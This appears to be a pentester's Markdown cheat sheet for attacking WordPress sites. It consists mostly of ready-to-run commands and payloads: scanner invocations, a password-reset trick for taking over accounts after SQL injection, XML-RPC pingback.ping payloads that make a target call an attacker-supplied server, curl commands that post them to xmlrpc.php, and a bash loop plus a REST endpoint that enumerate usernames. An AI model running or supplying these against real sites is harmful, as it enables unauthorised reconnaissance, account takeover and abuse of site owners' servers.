# Wordpress

## Tools

```text
wpscan --url https://url.com
vulnx -u https://example.com/ --cms --dns -d -w -e
python3 cmsmap.py https://www.example.com -F
python3 wpseku.py --url https://www.target.com --verbose
```

```text
# Check IP behing WAF:
https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/

# SQLi in WP and can't crack users hash:
1. Request password reset.
2. Go to site.com/wp-login.php?action=rp&key={ACTIVATION_KEY}&login={USERNAME}

# XMLRPC
# https://github.com/nullfil3/xmlrpc-scan
# https://github.com/relarizky/wpxploit
# https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/

# pingback.xml:
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value>
   <string>http://10.0.0.1/hello/world</string>
  </value>
 </param>
 <param>
  <value>
   <string>https://10.0.0.1/hello/world/</string>
  </value>
 </param>
</params>
</methodCall>

<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>

# List methods:
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>

curl -X POST -d @pingback.xml https://exmaple.com/xmlrpc.php

# Evidence xmlrpc:
curl -d '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>demo.sayHello</methodName><params/></methodCall>' -k https://example.com/xmlrpc.php

# Enum User:
for i in {1..50}; do curl -s -L -i https://example.com/wordpress?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'; done
site.com/wp-json/wp/v2/users/

```



